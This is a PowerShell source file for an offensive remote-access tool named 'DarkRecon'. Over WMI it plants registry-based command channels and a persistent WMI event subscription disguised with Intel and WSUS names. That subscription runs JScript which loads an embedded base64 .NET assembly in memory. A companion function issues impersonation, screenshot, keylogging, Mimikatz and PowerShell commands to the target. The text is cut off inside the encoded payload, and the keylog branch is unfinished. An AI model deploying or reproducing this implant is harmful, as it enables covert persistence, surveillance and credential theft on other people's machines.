function Install-RemoteRecon {
    <#
    .SYNOPSIS
    Short description
    
    .DESCRIPTION
    Long description
    
    .EXAMPLE
    An example
    
    .NOTES
    General notes
    #>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$false, ParameterSetName = 'Credential')]
        [ValidateNotNullOrEmpty()]
        [string]$ComputerName,

        [parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [string]$RegistryPath = "SOFTWARE\Intel\PSIS",

        [parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [string]$ClassName = 'WSUSClass',

        [parameter(Mandatory=$False)]
        [ValidateNotNullOrEmpty()]
        [string]$FilterName = 'WSUSFilter',

        [parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [string]$ConsumerName = 'WSUSConsumer',

        [parameter(Mandatory=$false, ParameterSetName = 'Credential')]
        [ValidateNotNullOrEmpty()]
        [string]$Username,

        [parameter(Mandatory=$false, ParameterSetName = 'Credential')]
        [ValidateNotNullOrEmpty()]
        [string]$Password
    )

    $wmiArgs = @{}
    $commonArgs = @{}

    #default key values

    $RunKey = "Run"
    $CommandKey = "Command"
    $CommandArgsKey = "Args"
    $ResultsKey = "Result"
    $ScreenShotKey = "Screenshot"
    $KeylogKey = "Keylog"

    #if the credential parametersetname is used, assign the credential object and computername appropriately
    if ($PSCmdlet.ParameterSetName -eq 'Credential') {
        #Check if UserName and password are given
        if ($PSBoundParameters['Username'] -and $PSBoundParameters['Password']) {
            $secPassword = $Password | ConvertTo-SecureString -AsPlainText -Force
            $credential = New-Object System.Management.Automation.PSCredential $Username,$secPassword
            $commonArgs['Credential'] = $credential
        }

        if ($PSBoundParameters['ComputerName']) {
            $commonArgs['ComputerName'] = $ComputerName
        }
    }

    $HKEY_LOCAL_MACHINE = [UInt32]2147483650
    $RegistryPath = $RegistryPath.Replace('\', '\\')

    #Setup the registry keys for DarkRecon C2
    $wmiArgs['Namespace'] = 'root\default'
    $wmiArgs['Class'] = 'StdRegProv'
    $wmiArgs['Name'] = "CreateKey"
    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath

    Write-Verbose "[+] Setting up registry keys for DarkRecon C2"
    $result = Invoke-WmiMethod @wmiArgs @commonArgs

    if ($result.ReturnValue -ne 0) {
        Write-Verbose "[-] Unable to create registry key for DarkRecon"
        $result
        break
    }

    $wmiArgs['Name'] = "SetStringValue"
    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"",$RunKey

    $result = Invoke-WmiMethod @wmiArgs @commonArgs

    if ($result.ReturnValue -ne 0) {
        Write-Verbose "[-] Unable to set value for $RunKey"
        $result
        break
    }

    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"",$CommandKey

    $result = Invoke-WmiMethod @wmiArgs @commonArgs

    if ($result.ReturnValue -ne 0) {
        Write-Verbose "[-] Unable to set value for $CommandKey"
        $result
        break
    }

    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"",$CommandArgsKey

    $result = Invoke-WmiMethod @wmiArgs @commonArgs

    if ($result.ReturnValue -ne 0) {
        Write-Verbose "[-] Unable to set value for $CommandArgsKey"
        $result
        break
    }

    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"",$ResultsKey

    $result = Invoke-WmiMethod @wmiArgs @commonArgs

    if ($result.ReturnValue -ne 0) {
        Write-Verbose "[-] Unable to set value for $ResultsKey"
        $result
        break
    }

    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"",$ScreenShotKey

    $result = Invoke-WmiMethod @wmiArgs @commonArgs

    if ($result.ReturnValue -ne 0) {
        Write-Verbose "[-] Unable to set value for $ScreenShotKey"
        $result
        break
    }

    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"",$KeylogKey

    $result = Invoke-WmiMethod @wmiArgs @commonArgs

    if ($result.ReturnValue -ne 0) {
        Write-Verbose "[-] Unable to set value for $KeylogKey"
        $result
        break
    }

    #Setup the Remote Wmi event subscription
    $EventFilterArgs = @{
        EventNamespace = 'root\cimv2'
        Name = $FilterName
        Query = "SELECT * FROM RegistryValueChangeEvent WHERE Hive='HKEY_LOCAL_MACHINE' AND KeyPath='$RegistryPath' AND ValueName='$RunKey'"
        QueryLanguage = "WQL"
    }

    Start-Sleep -Seconds 10
    #Install the filter
    Write-Verbose "[+] Installing the filter"
    $Filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments $EventFilterArgs @commonArgs

    $DarkReconJS = $DarkReconJS -replace 'BASE_PATH',$RegistryPath
    $DarkReconJS = $DarkReconJS -replace 'INIT_KEY',$RunKey
    $DarkReconJS = $DarkReconJS -replace 'COMMAND_KEY',$CommandKey
    $DarkReconJS = $DarkReconJS -replace 'COMMAND_ARG_KEY',$CommandArgsKey
    $DarkReconJS = $DarkReconJS -replace 'COMMAND_RESULT_KEY',$ResultsKey
    $DarkReconJS = $DarkReconJS -replace 'SCSTORE_KEY',$ScreenShotKey
    $DarkReconJS = $DarkReconJS -replace 'KLSTORE_KEY',$KeylogKey

    $ActiveScriptEventConsumerArgs = @{
        Name = $ConsumerName
        ScriptingEngine = 'JScript'
        ScriptText = $DarkReconJS
    }

    Write-Verbose "[+] Installing the ActiveScriptEventConsumer"
    $Consumer =  Set-WmiInstance -Namespace "root\subscription" -Class "ActiveScriptEventConsumer" -Arguments $ActiveScriptEventConsumerArgs @commonArgs
    Start-Sleep -Seconds 5

    $FilterToConsumerArgs = @{
        Filter = $Filter
        Consumer = $Consumer
    }

    

    Write-Verbose "[+] Creating the FilterToConsumer binding"
    Start-Sleep -Seconds 10
    $FilterToConsumerBinding = Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments $FilterToConsumerArgs @commonArgs

    Write-Verbose "[+] Triggering DarkRecon execution via the registry on $ComputerName"

    Start-Sleep -Seconds 10

    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"Start",$RunKey

    $result = Invoke-WmiMethod @wmiArgs @commonArgs

    if ($result.ReturnValue -ne 0) {
        Write-Verbose "[-] Unable to set registry value for $RunKey and trigger DarkRecon execution"
        break
    }

    Write-Verbose "[+] DarkRecon started"

    Write-Verbose "[+] Cleaning up the subscription"
    Start-Sleep -Seconds 5
    $EventConsumerToCleanup = Get-WmiObject -Namespace root\subscription -Class ActiveScriptEventConsumer -Filter "Name = '$ConsumerName'" @commonArgs
    $EventFilterToCleanup = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name = '$FilterName'" @commonArgs
    $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root\subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" @commonArgs

    $EventConsumerToCleanup | Remove-WmiObject
    $EventFilterToCleanup | Remove-WmiObject
    $FilterConsumerBindingToCleanup | Remove-WmiObject

    $OutputObject = New-Object -TypeName PSObject
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'ComputerName' -Value $ComputerName
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'BaseRegistryPath' -Value $RegistryPath
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'RunKey' -Value $RunKey
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'CommandKey' -Value $CommandKey
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'CommandArgsKey' -Value $CommandArgsKey
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'ResultsKey' -Value $ResultsKey
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'ScreeShotResultKey' -Value $ScreenShotKey
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'KeyLogResultKey' -Value $KeylogKey

    $OutputObject
}

function Invoke-DarkReconCmd {
    <#
    .SYNOPSIS
    Short description
    
    .DESCRIPTION
    Long description
    
    .EXAMPLE
    An example
    
    .NOTES
    General notes
    #>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [string]$ComputerName,

        [parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [string]$Username,

        [parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [string]$Password,

        [parameter(Mandatory=$true, ParameterSetName='Impersonate')]
        [switch]$Impersonate,

        [parameter(Mandatory=$true, ParameterSetName='Impersonate')]
        [ValidateNotNullOrEmpty()]
        [int]$ProcessId,

        [parameter(Mandatory=$true, ParameterSetName='Screenshot')]
        [switch]$Screenshot,

        [parameter(Mandatory=$false, ParameterSetName='Screenshot')]
        [ValidateNotNullOrEmpty()]
        [string]$ImagePath = "$pwd\$(Get-Date -f 'yyyy-mm-dd-hh-mm-ss').png",

        [parameter(Mandatory=$true, ParameterSetName='Keylog')]
        [switch]$keylog,

        [parameter(Mandatory=$false, ParameterSetName='Keylog')]
        [switch]$Watch,

        [parameter(Mandatory=$false, ParameterSetName='Keylog')]
        [ValidateNotNullOrEmpty()]
        [int]$Interval,

        [parameter(Mandatory=$true, ParameterSetName='Mimikatz')]
        [switch]$Mimikatz,

        [parameter(Mandatory=$true, ParameterSetName='MimikatzCommand')]
        [ValidateNotNullOrEmpty()]
        [string]$MimikatzCommand,

        [parameter(Mandatory=$true, ParameterSetName='PowerShell')]
        [switch]$PowerShell,

        [parameter(Mandatory=$true, ParameterSetName='PowerShellCommand')]
        [ValidateNotNullOrEmpty()]
        [string]$PowerShellCommand,

        [parameter(Mandatory=$true, ParameterSetName='Sleep')]
        [switch]$Sleep,

        [parameter(Mandatory=$true, ParameterSetName='Sleep')]
        [ValidateNotNullOrEmpty()]
        [int]$Time,

        [parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [string]$RegistryPath = "SOFTWARE\\Intel\\PSIS",

        [parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [int]$Timeout = 10
    )

    $wmiArgs = @{}
    $commonArgs = @{}

    $HKEY_LOCAL_MACHINE = [UInt32]2147483650
    $RegistryPath = $RegistryPath.Replace('\', '\\')

    #Yes I'm lazy. I declared all the key values here. So what.
    $RunKey = "DRun"
    $CommandKey = "DCommand"
    $CommandArgsKey = "DArgs"
    $ResultsKey = "DResult"
    $ScreenShotKey = "DScreenshot"
    $KeylogKey = "DKeylog"

    #Credentials will not work for local Wmi commands
    if ($PSBoundParameters['ComputerName'] -and ($PSBoundParameters['ComputerName'] -ne '.' -or $PSBoundParameters['ComputerName'] -ne 'localhost' -or $PSBoundParameters['ComputerName'] -ne '127.0.0.1')) {
        $commonArgs['ComputerName'] = $ComputerName

        if ($PSBoundParameters['Username'] -and $PSBoundParameters['Password']) {
            $secPassword = $Password | ConvertTo-SecureString -AsPlainText -Force
            $credential = New-Object System.Management.Automation.PSCredential $Username,$secPassword
            $commonArgs['Credential'] = $credential
        }
    }

    $wmiArgs = @{
        Namespace = 'root\default'
        Class = 'StdRegProv'
        Name = 'SetStringValue'
    }

    $returnObject = New-Object -TypeName PSObject
    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'ComputerName' -Value $ComputerName
    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'Command' -Value ''
    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'CommandArguments' -Value ''
    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'Result' -Value ''
    $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'CommandResult' -Value ''

    switch ($PSCmdlet.ParameterSetName) {
        'Impersonate' {
            
            # Send the command argument first so it isn't missed when the agent picks up the command
            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"$ProcessId",$CommandArgsKey
            $returnObject.CommandArguments = $ProcessId
            Write-Verbose "[+] Sending impersonate command arguments"
            $result = Invoke-WmiMethod @wmiArgs @commonArgs
            if ($result.ReturnValue -ne 0) {
                Write-Verbose "[-] Unable to issue impersonate command."
            }
            
            #send the command 
            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"impersonate",$CommandKey
            $returnObject.Command = "impersonate"
            Write-Verbose "[+] Sending impersonate command"
            $result = Invoke-WmiMethod @wmiArgs @commonArgs
            if ($result.ReturnValue -ne 0) {
                Write-Warning "[-] Unable to issue impersonate command."
            }

            Start-Sleep -Seconds $Timeout

            Write-Verbose "[+] Retrieving command result"
            $wmiArgs['Name'] = 'GetStringValue'
            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$ResultsKey

            $result = Invoke-WmiMethod @wmiArgs @commonArgs

            if ($result.ReturnValue -ne 0) {
                Write-Warning "[-] Unable to obtain command result"
            }
            else {
                $returnObject.Result = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($result.sValue))
            }

            $returnObject
        }

        'Screenshot' {
            #send the command 
            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"screenshot",$CommandKey
            $returnObject.Command = "screenshot"
            Write-Verbose "[+] Sending screenshot command"
            $result = Invoke-WmiMethod @wmiArgs @commonArgs
            if ($result.ReturnValue -ne 0) {
                Write-Warning "[-] Unable to issue screenshot command."
            }

            #Wait the timeout period to retrieve the result
            Start-Sleep -Seconds $Timeout
            Write-Verbose "[+] Retrieving command result"
            $wmiArgs['Name'] = 'GetStringValue'
            $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$ResultsKey

            $result = Invoke-WmiMethod @wmiArgs @commonArgs

            if ($result.ReturnValue -ne 0) {
                Write-Warning "[-] Unable to obtain command result"
            }
            else {
                $result = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($result.sValue))
                if ($result -contains "success") {
                    $returnObject.Result = $result 

                    $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,$ScreenShotKey
                    $result = Invoke-WmiMethod @wmiArgs @commonArgs

                    if ($result.ReturnValue -eq 0) {
                        $imageBytes = [Convert]::FromBase64String($result.sValue)
                        [System.IO.File]::WriteAllBytes($ImagePath, $imageBytes)

                        $returnObject.CommandResult = (Get-ChildItem -Path $ImagePath).FullName
                    }
                }
                else {
                    $returnObject.Result = $result
                }

                $returnObject
            }
        }
        'Keylog' {
             $wmiArgs['ArgumentList'] = $HKEY_LOCAL_MACHINE,$RegistryPath,"keylog",$CommandKey
        }
    }
}

$DarkReconJS = @'
function setversion() {
    var shell = new ActiveXObject('WScript.Shell');
    ver = 'v4.0.30319';
    try {
    shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
    } catch(e) { 
    ver = 'v2.0.50727';
    }
    shell.Environment('Process')('COMPLUS_Version') = ver;

}
function debug(s) {WScript.Echo(s);}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"BAAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDAHbWV0aG9kMQMHAwMwU3lzdGVtLkRlbGVnYXRl"+
"U2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1i"+
"ZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2Vy"+
"aWFsaXphdGlvbkhvbGRlcgkCAAAACQMAAAAJBAAAAAkFAAAABAIAAAAwU3lzdGVtLkRlbGVnYXRl"+
"U2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdl"+
"dBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVu"+
"dHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50"+
"cnkGBgAAANoBU3lzdGVtLkNvbnZlcnRlcmAyW1tTeXN0ZW0uQnl0ZVtdLCBtc2NvcmxpYiwgVmVy"+
"c2lvbj0yLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkz"+
"NGUwODldLFtTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249Mi4w"+
"LjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0G"+
"BwAAAEttc2NvcmxpYiwgVmVyc2lvbj0yLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tl"+
"eVRva2VuPWI3N2E1YzU2MTkzNGUwODkGCAAAAAd0YXJnZXQwCQcAAAAGCgAAABpTeXN0ZW0uUmVm"+
"bGVjdGlvbi5Bc3NlbWJseQYLAAAABExvYWQJDAAAAA8DAAAAADYAAAJNWpAAAwAAAAQAAAD//wAA"+
"uAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0h"+
"uAFMzSFUaGlzIHByb2dyYW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBF"+
"AABMAQMAav1gWQAAAAAAAAAA4AAiAAsBMAAALAAAAAgAAAAAAADySgAAACAAAABgAAAAAEAAACAA"+
"AAACAAAEAAAAAAAAAAQAAAAAAAAAAKAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAA"+
"EAAAAAAAAAAAAAAAoEoAAE8AAAAAYAAArAUAAAAAAAAAAAAAAAAAAAAAAAAAgAAADAAAAGhJAAAc"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAA"+
"AAAIIAAASAAAAAAAAAAAAAAALnRleHQAAAD4KgAAACAAAAAsAAAAAgAAAAAAAAAAAAAAAAAAIAAA"+
"YC5yc3JjAAAArAUAAABgAAAABgAAAC4AAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAgAAA"+
"AAIAAAA0AAAAAAAAAAAAAAAAAABAAABCAAAAAAAAAAAAAAAAAAAAANRKAAAAAAAASAAAAAIABQBE"+
"JAAAJCUAAAEAAAADAAAGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAHgIoDwAACiqyHY0cAAABJRYDoiUXBKIlGAWiJRkOBKIlGg4FoiUbDgaiJRwOB6IoAwAA"+
"BioAAAAbMAQANQIAAAEAABECjmkdLwYWKBAAAAoCFpoKAheaCwIYmgwCGZoNAhqaEwQCG5omAhya"+
"EwV+EQAAChMGEQYGGG8SAAAKEwfd4gEAACYUEwfd2QEAAHIBAABwEwgRBwhvEwAACnQcAAABEwkR"+
"CXIDAABwKBQAAAotWhEJchsAAHAoFAAACjrCAAAAEQlyMQAAcCgUAAAKOoMBAAARCXJFAABwKBQA"+
"AAo6cgEAABEJclsAAHAoFAAACjphAQAAEQlybQAAcCgUAAAKOgIBAAA4SwEAABEHCW8TAAAKdBwA"+
"AAERBwlyAQAAcG8VAAAKEQcIcgEAAHBvFQAACigWAAAKKAQAAAaAAwAABHJ7AABwKBcAAApvGAAA"+
"CigZAAAKEwh+AwAABC0HcpkAAHATCBEHEQQoGgAAChEIbxsAAAooHAAACm8VAAAKONIAAAByAQAA"+
"cBMKKAUAAAYTChEHCHIBAABwbxUAAAoRCnIBAABwKB0AAAosLnLDAABwEwgRBxEEKBoAAAoRCG8b"+
"AAAKKBwAAApvFQAAChEHEQURCm8VAAAKK3ty0wAAcH4EAAAEKBkAAAoTCBEHEQQoGgAAChEIbxsA"+
"AAooHAAACm8VAAAKK04RBwhyAQAAcG8VAAAKfgMAAAQsCn4DAAAEbx4AAApy+wAAcCgXAAAKbxgA"+
"AAooGQAAChMIEQcRBCgaAAAKEQhvGwAACigcAAAKbxUAAAp+AQAABCDoAwAAWigfAAAKEQcsDREH"+
"B28TAAAKOhb+//8qAAAAARAAAAAAMQAQQQAJEwAAARswAwBwAAAAAgAAEX4gAAAKCn4gAAAKCxQM"+
"IP8PHwAXAigUAAAGCgZ+IAAACighAAAKLBwgAAQAABcCKBQAAAYKBn4gAAAKKCEAAAosAggqBiD/"+
"AQ8AEgEoEgAABi0CCCoHcyIAAAoNCW8jAAAKDN4GJhQTBN4CCCoRBCoBEAAAAABcAAllAAYTAAAB"+
"GzAIAKcAAAADAAARcgEAAHAKKCQAAApvJQAACg0SAygmAAAKKCQAAApvJQAACg0SAygnAAAKcygA"+
"AAoLBygpAAAKJSgkAAAKbyUAAAoNEgMoKgAACigkAAAKbyUAAAoNEgMoKwAAChYWB28sAAAKICAA"+
"zABvLQAACm8uAAAKcy8AAAoMBwgoMAAACm8xAAAKCG8yAAAKKBwAAAoKBhME3g9vMwAACoAEAAAE"+
"BhME3gARBCoAARAAAAAABgCPlQAPEwAAAV4bgAEAAARzNAAACoACAAAEFIADAAAEKkJTSkIBAAEA"+
"AAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAAJAOAAAjfgAA/A4AAKgQAAAjU3RyaW5ncwAAAACk"+
"HwAAGAEAACNVUwC8IAAAEAAAACNHVUlEAAAAzCAAAFgEAAAjQmxvYgAAAAAAAAACAAABVz0CFAkC"+
"AAAA+gEzABYAAAEAAAApAAAABwAAAK0AAAAYAAAALwAAADQAAACiAAAADwAAAAEAAAADAAAABQAA"+
"ABEAAAABAAAAAwAAAAQAAAAAAAQLAQAAAAAABgA7CvkNBgCoCvkNBgCICagNDwAZDgAABgCwCbkM"+
"BgAeCrkMBgD/CbkMBgCPCrkMBgBbCrkMBgB0CrkMBgDHCbkMBgCcCdoNBgB6CdoNBgDiCbkMBgDq"+
"Di0MBgA4DZ0PBgCpD64LBgAREAoABgDLDC0MBgCYEK4LCgAHDWwLBgAgDDAFCgAmCWwLCgCmDGwL"+
"BgDGCogQBgBGCS0MBgA7DC0MBgBlCy0MBgAmDy0MBgBlEAoABgCTCwoABgBdDy0MBgA0C50PBgCU"+
"CCMLBgBzDS0MDgBaDF8OCgB+DWwLCgDkCGwLCgAWC2wLCgC9Dj0LBgAmDDAFAAAAAC4AAAAAAAEA"+
"AQABABAAIA8AAD0AAQABAAAAEACMCwAAPQAFAAcACgEQAA4HAABpABAAGQACAQAAZAgAAG0AFAAZ"+
"AAIBAACmBgAAbQB0ABkAAgEAAO0MAABtAIYAGQAWABQNKgMWAJAPLQMWAMUPMQMWANoMNQNWgMQD"+
"KgNWgCUFKgNWgBcFKgNWgPMBKgNWgPMHKgNWgAMCKgNWgJAMKgNWgL4GOANWgOcAKgNWgMMEKgNW"+
"gM8GKgMGAPYOKgMGACINKgMGAA4PKgMGADQMKgMGBkAIKgNWgE4EOwNWgFoEOwNWgKoDOwNWgJ0D"+
"OwNWgOwEOwNWgG4FOwNWgHoFOwNWgKgBOwNWgGoBOwNWgLYBOwNWgHoBOwNWgEMAOwNWgDcAOwNW"+
"gJAEOwNWgJoEOwNWgK0FOwNWgLkFOwNWgJUHOwNWgC4EOwNWgD4EOwNWgJ8HOwNWgEQHOwNWgLcD"+
"OwNWgJADOwNWgN0COwNWgPkEOwNWgGYEOwNWgG8EOwNWgGoCOwNWgHQCOwNWgIoBOwNWgMQBOwNW"+
"gJkBOwNWgM8BOwNWgAcDOwNWgBUDOwNWgF0DOwNWgGwDOwNWgLsCOwNWgMwCOwNWgCIHOwNWgOsG"+
"OwNWgLoAOwNWgCYGOwNWgOkBOwNWgEsBOwNWgFUBOwNWgJsCOwNWgKsCOwNWgHgEOwNWgIQEOwNW"+
"gN0EOwNWgC0COwNWgDkCOwNWgE4COwNWgFwCOwNWgF8BOwNWgPcAOwNWgAYBOwNWgCMDOwNWgDED"+
"OwNWgBUBOwNWgCQBOwNWgHsDOwNWgIgHOwNWgIcCOwNWgJECOwNWgMUFOwNWgD8DOwNWgE4DOwNW"+
"gNoBOwNWgMkAOwNWgFQHOwNWgPcDOwNWgBwEOwNWgOQDOwNWgAkEOwNWgJkGOwNWgPkGOwNWgKwA"+
"OwNWgEwFOwNWgF0FOwNWgJAAOwNWgIYFOwNWgJUFOwNWgCIAOwNWgGkHOwNWgDoFOwNWgKAFOwNW"+
"gNMFOwNWgLIEOwNWgAcFOwNWgNMDOwNWgDMBOwNWgJwAOwMGBkAIKgNWgFENPwNWgIIOPwNWgEEO"+
"PwNWgEYNPwNWgCYNPwNWgMgLPwNWgNQIPwNWgFAJPwNWgNkLPwNWgJgNPwNWgLsNPwNWgHsIPwNW"+
"gCgOPwNWgLQIPwNWgEsPPwNWgPUPPwNWgHoMPwMGBkAIKgNWgKQEQwNWgOgHQwNWgH4CQwNWgEUC"+
"QwNWgBYGQwNWgAcGQwNWgIYDQwNWgPAFQwNWgOUFQwNWgB4GQwNWgIQGQwNWgOIGQwNWgI8GQwNW"+
"gCECQwNWgE8GQwNWgEYGQwNWgFkGQwNWgHsGQwNWgGcGQwNWgHAGQwNWgMoHQwNWgBkIQwNWgDEI"+
"QwNWgDcGQwNWgL8HQwNWgA4IQwNWgBUCQwNWgNsAQwNWgPcFQwNWgO8CQwNWgBMHQwNWgNIHQwNW"+
"gCEIQwNWgLAHQwNWgP8HQwNWgOYCQwNWgAAGQwNWgA8GQwNWgDcHQwNQIAAAAACGGGYNBgABAFgg"+
"AAAAAIYAcgxHAwEAiCAAAAAAlgB1DFIDCADcIgAAAACWAG4JWAMJAGgjAAAAAJYAPQ9eAwoALCQA"+
"AAAAkRhsDWIDCgAAAAAAgACWIIQAZgMKAAAAAACAAJYgyQ5rAwsAAAAAAIAAliDND3MDDQAAAAAA"+
"gACWIBkPdwMNAAAAAACAAJYg9wyFAxYAAAAAAIAAliBPAGYDGQAAAAAAgACWIOQOjAMaAAAAAACA"+
"AJYgYgCAABwAAAAAAIAAliB1AGYDHgAAAAAAgACWINcOZgMfAAAAAACAAJYghw2SAyAAAAAAAIAA"+
"liBhDJgDIQAAAAAAgACWYOoIoAMlAAAAAACAAJYgqg6lAyYAAAAAAIAAliB0DqwDKQAAAAAAgACW"+
"IGwAsgMrAAAAAACAAJYgfgBmAy8AUCAAAAAAhhhmDQYAMAAAAAEAKBAAAAIAOhAAAAMAHRAAAAQA"+
"SxAAAAUAQRAAAAYAMBAAAAcAVxAAAAEAWg4AAAEAmwgAAAEAeg0AAAEAnwgAAAIA8Q4AAAEAZQ8A"+
"AAIAeQ8AAAMAfw8AAAQAcw8AAAUAbQ8AAAYAyggAAAcAcQgAAAgAdggAAAkAHg0AAAEAYAgAAAIA"+
"hQsAAAMABg8AAAEAYAgAAAEAYAgAAAIAGg0AAAEAnwgAAAIAXAgAAAEAXAgAAAEAXAgAAAEA3g8A"+
"IAAAAAAAAAEAAgkAAAIAjg4CAAMA9ggAAAEAHwkAAAEAnA4AAAIAEAkAAAMAiggAAAEAYAgAAAIA"+
"5g8AAAEAWw0AAAIAqQgAAAMAhQ8AAAQASAgAAAEApAgJAGYNAQARAGYNBgAZAGYNCgApAGYNEAAx"+
"AGYNEAA5AGYNEABBAGYNEABJAGYNEABRAGYNEABZAGYNEABhAGYNFQBpAGYNEABxAGYNEADJAGYN"+
"BgB5AGYNBgDpABQPKgDxADkJLwCRAAYQMwCRAO0KOwDhAG4QQACRAPYKRgABARoATAChADIPUQCh"+
"ADAJVgDhALYOWgAJAf0CYAAJAVEOZgABAVQLbADhAHoQQACJANUMBgARAQ4NKgAZAegMfQAZAW4Q"+
"gAChAGYNhgChAGIJiwAhAU8MmwAhAc8NoQC5AHsLpgC5APsOpgCpAGYNqgApAeAIsAC5AOIHpgC5"+
"ADoIpgAxARILuQApAUAMvwApAVoJBgCxAGYNBgBBARsLzAAxAf8K0gCxAO0P3AB5AGMLVgCBAGYN"+
"BgAIABQA8wAIABgA+AAIABwA/QAIACAAAgEIACQABwEIACgADAEIACwAAgEJADAAEQEIADQAFgEI"+
"ADgAGwEIADwAIAEIAFQAJQEIAFgAKgEIAFwAAgEIAGAALwEIAGQADAEIAGgANAEIAGwAOQEIAHAA"+
"PgEIAHQAPgEIAHgABwEIAHwABwEIAIAAQwEIAIQASAEIAIgATQEIAIwAUgEIAJAA8wAIAJQAVwEI"+
"AJgAXAEIAJwAYQEIAKAAZgEIAKQAawEIAKgAcAEIAKwAdQEIALAAegEIALQAfwEIALgAhAEIALwA"+
"iQEIAMAAjgEIAMQAkwEIAMgAmAEIAMwAnQEIANAAnQEIANQAogEIANgAogEIANwApwEIAOAArAEI"+
"AOQAsQEIAOgAtgEIAOwAuwEIAPAAwAEIAPQAxQEIAPgAygEIAPwAzwEIAAAB1AEIAAQB2QEIAAgB"+
"3gEIAAwB4wEIABAB6AEIABQB7QEIABgB8gEIABwB9wEIACAB/AEIACQBAQIIACgBBgIIACwBCwII"+
